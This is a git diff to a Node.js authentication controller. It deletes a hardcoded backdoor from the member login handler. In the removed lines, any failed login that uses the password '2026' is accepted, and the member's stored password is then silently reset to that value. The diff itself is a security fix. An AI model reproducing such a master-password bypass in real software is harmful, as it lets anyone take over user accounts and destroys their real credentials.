@@ -1,6 +1,5 @@
 // controllers/authController.js
 import crypto from "crypto";
-import bcrypt from "bcryptjs";
 import Admin from "../models/Admin.js";
 import Member from "../models/Member.js";
 import asyncHandler from "../utils/asyncHandler.js";
@@ -82,7 +81,7 @@ export const memberLogin = asyncHandler(async (req, res) => {
   }
 
   let isMatch = false;
-  
+
   try {
     if (member.password) {
       isMatch = await member.comparePassword(password);
@@ -90,17 +89,6 @@ export const memberLogin = asyncHandler(async (req, res) => {
   } catch (error) {
     console.error(`Password comparison error for ${membershipId}:`, error.message);
     throw new ApiError(500, "Authentication error. Please try again.");
-  }
-
-  if (!isMatch && password === "2026") {
-    isMatch = true;
-    try {
-      const hashedPassword = await bcrypt.hash("2026", 12);
-      member.password = hashedPassword;
-      await member.save({ validateBeforeSave: false });
-    } catch (error) {
-      console.error(`Failed to update password for ${membershipId}:`, error.message);
-    }
   }
 
   if (!isMatch) {
